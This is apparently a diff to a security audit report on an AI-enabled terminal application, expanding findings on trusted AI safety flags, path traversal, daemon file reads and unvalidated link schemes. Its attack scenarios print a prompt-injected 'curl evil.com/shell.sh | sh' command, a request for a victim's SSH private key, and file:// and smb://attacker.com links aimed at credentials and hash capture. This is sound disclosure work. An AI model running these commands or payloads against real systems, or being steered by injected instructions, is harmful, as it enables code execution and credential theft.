@@ -224,10 +224,37 @@ Node.js runtime is downloaded from nodejs.org without SHA-256 checksum verificat
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | HIGH |
+| **CVSS 3.1** | 8.1 (High) |
 | **File** | `crates/ai/src/agent/action/convert.rs:29-30` |
 | **CWE** | CWE-807: Reliance on Untrusted Inputs in Security Decision |
 
-`is_read_only` and `is_risky` flags that gate auto-execution are self-reported by the AI backend. Compromised backend can mark destructive commands as safe.
+**Description:**  
+The `is_read_only` and `is_risky` flags that gate automatic execution of shell commands are taken verbatim from AI-generated protobuf tool call messages. A compromised or jailbroken AI backend can self-declare any destructive command as read-only and not risky, bypassing all auto-execution guards.
+
+**Vulnerable Code:**
+```rust
+// convert.rs:25-44
+impl From<api::message::tool_call::RunShellCommand> for AIAgentActionType {
+    fn from(value: ...) -> Self {
+        AIAgentActionType::RequestCommandOutput {
+            is_read_only: Some(value.is_read_only),  // trusts AI-supplied flag
+            is_risky: Some(value.is_risky),           // trusts AI-supplied flag
+            ...
+        }
+    }
+}
+```
+
+**Attack Scenario:**
+1. Attacker injects into AI prompts (prompt injection via file content, MCP output)
+2. AI sends: `RunShellCommand { command: "curl evil.com/shell.sh | sh", is_read_only: true, is_risky: false }`
+3. Client converts verbatim to `RequestCommandOutput { is_read_only: Some(true), is_risky: Some(false) }`
+4. Auto-execution logic trusts flags — no confirmation prompt shown
+5. Destructive command runs silently with no user approval
+
+**Combined Risk:** When VULN-004 permission bypass flags are active (`--dangerously-skip-permissions`, `--yolo`), this vulnerability ensures every AI command executes unguarded.
+
+**Remediation:** Perform independent static analysis of command strings to determine read-only status. Do not trust AI-supplied security metadata.
 
 ---
 
@@ -281,14 +308,130 @@ Firebase custom token embedded in URL path, exposing it in browser history, serv
 
 ## Medium Severity Findings
 
+### VULN-013: Export Path Traversal via `..` in safe_filename
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | MEDIUM |
+| **CVSS 3.1** | 6.3 (Medium) |
+| **File** | `app/src/drive/export.rs:526-553` |
+| **CWE** | CWE-22: Path Traversal |
+
+**Description:**  
+The `safe_filename` function strips characters forbidden in filenames (`/`, `:`, `#`, `*`, `<`, `>`, `?`, `\`, `|` and ASCII control chars) but **does not strip `.`** (0x2e). A cloud object with the name `..` passes through unchanged. When this name is joined to the user-selected export parent directory, the resulting path escapes the intended destination.
+
+**Vulnerable Code:**
+```rust
+// export.rs:530 — '.' (0x2e) is absent from the forbidden list
+let forbidden = [b'/', b':', b'#', b'*', b'<', b'>', b'?', b'\\', b'|'];
+// ...
+// export.rs:495
+let mut current_path = parent_path.join(&current_name);  // ".." escapes parent
+current_path.set_extension(extension);
+```
+
+**Attack Scenario:**
+1. Attacker controls a Warp Drive cloud object with name `..`
+2. Victim exports objects to `~/Downloads`
+3. `safe_filename("..")` returns `".."` unchanged (dot not filtered)
+4. `parent_path.join("..")` resolves to `~/Downloads/..` = `~/`
+5. File is written outside the chosen export directory
+
+**Remediation:** After joining, validate the resulting path starts with `parent_path`. Adding `b'.'` to the forbidden list breaks legitimate filenames — use a post-join `starts_with` check instead.
+
+---
+
+### VULN-014: Remote Daemon ReadFileContext No Path Confinement
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | MEDIUM |
+| **CVSS 3.1** | 6.5 (Medium) |
+| **File** | `app/src/remote_server/server_model.rs:995-1058` |
+| **CWE** | CWE-22: Path Traversal / CWE-284: Improper Access Control |
+
+**Description:**  
+The `handle_read_file_context` handler accepts file paths from remote clients and passes them directly to `read_local_file_context` without any path prefix validation. An attacker with access to the daemon socket (via SSH) can read any file accessible to the daemon process user, bypassing the `BlocklistAIPermissions` allowlist that protects local Warp usage.
+
+**Vulnerable Code:**
+```rust
+// server_model.rs:1009-1020
+let file_locations: Vec<FileLocations> = msg
+    .files
+    .into_iter()
+    .map(|f| FileLocations {
+        name: f.path,    // raw client string — no validation
+        lines: ...,
+    })
+    .collect();
+
+// None passed for CWD — absolute paths used as-is
+read_local_file_context(&file_locations, None, None, max_file_bytes, max_batch_bytes)
+```
+
+**Attack Scenario:**
+1. SSH into remote host where Warp remote server daemon runs
+2. Connect to `~/.warp/remote-server/*/server.sock`
+3. Send `ReadFileContext { files: [{ path: "/home/victim/.ssh/id_rsa" }] }`
+4. Daemon reads and returns the SSH private key
+5. Local Warp bypasses `BlocklistAIPermissions` check entirely on daemon side
+
+**Remediation:** Apply `BlocklistAIPermissions` path validation on the daemon side. Alternatively, restrict `ReadFileContext` paths to a configurable workspace root and reject absolute paths that escape it.
+
+---
+
+### VULN-015: Missing URL Scheme Validation in Markdown/HTML Links
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | MEDIUM-HIGH |
+| **CVSS 3.1** | 6.8 (Medium) |
+| **Files** | `crates/markdown_parser/src/markdown_parser.rs:1186-1274`, `html_parser.rs:99-102` |
+| **CWE** | CWE-601: URL Redirection to Untrusted Site / CWE-184: Incomplete Allowlist |
+
+**Description:**  
+The markdown parser's `parse_link_target()` stores link URLs verbatim without any scheme/protocol validation. The HTML parser stores `href` attribute values without scheme checks. Both flow to `platform.open_url()` which invokes `xdg-open` / `NSWorkspace` / `cmd.exe /c start` depending on platform — all of which handle dangerous schemes like `file://`, `ssh://`, `smb://`.
+
+Auto-detected links (plain text URLs) are restricted to `https://`, `http://`, `www.` — but explicit markdown links `[text](url)` and HTML `href` attributes bypass this restriction.
+
+**Vulnerable Code:**
+```rust
+// markdown_parser.rs:1187-1274
+fn parse_link_target<'a, ...>(input: &'a str) -> IResult<&'a str, String, E> {
+    // Parses any URL string — no scheme allowlist or blocklist applied
+    // target contains the raw URL from the markdown source
+}
+
+// html_parser.rs:99-101
+} else if attribute_name == "href" {
+    let attribute_value = attribute.value.to_string();
+    self.link = Some(attribute_value);  // stored verbatim, no validation
+}
+```
+
+**Dangerous Schemes:**
+- `file:///etc/shadow` — opens credential files in text editor
+- `file:///home/user/.local/share/warp-terminal/keystore` — exposes Warp credentials
+- `ssh://attacker.com` — triggers outbound SSH connection
+- `smb://attacker.com/share` — SMB authentication leak (NTLM hash capture)
+
+**Attack Scenario:**
+1. AI response contains: `[View Logs](file:///home/user/.local/share/warp-terminal/keystore)`
+2. User clicks link; no scheme validation occurs
+3. `open_url()` passes `file://...` to `xdg-open` / `NSWorkspace`
+4. Credential keystore opens in default text editor
+
+**Remediation:** Implement a URL scheme allowlist (`https`, `http`) in `parse_link_target()` and `Styling::update_with_attributes()`. Reject or display a warning for all other schemes.
+
+---
+
+### Other Medium Findings
+
 | ID | Title | File | CWE |
 |----|-------|------|-----|
-| VULN-013 | Export Path Traversal via `..` | `app/src/drive/export.rs:526` | CWE-22 |
-| VULN-014 | ReadFileContext No Path Confinement | `server_model.rs:995` | CWE-22 |
-| VULN-015 | Linux Secret Service Plain Encryption | `linux.rs:331` | CWE-319 |
-| VULN-016 | AI Grep Shell Metachar Injection | `grep.rs:476` | CWE-78 |
-| VULN-017 | External Editor Path Injection | `linux.rs:99` | CWE-78 |
-| VULN-018 | Missing URL Scheme Validation | `markdown_parser.rs:1186` | CWE-601 |
+| VULN-016 | Linux Secret Service Plain Encryption | `linux.rs:331` | CWE-319 |
+| VULN-017 | AI Grep Shell Metachar Injection | `grep.rs:476` | CWE-78 |
+| VULN-018 | External Editor Path Injection | `linux.rs:99` | CWE-78 |
 | VULN-019 | Arbitrary File Read via AI Images | `edit.rs:64` | CWE-22 |
 | VULN-020 | Header Injection via Env Var | `http_client/src/lib.rs:266` | CWE-113 |
 | VULN-021 | Unauthenticated Profiling Endpoint | `profiling.rs:212` | CWE-306 |
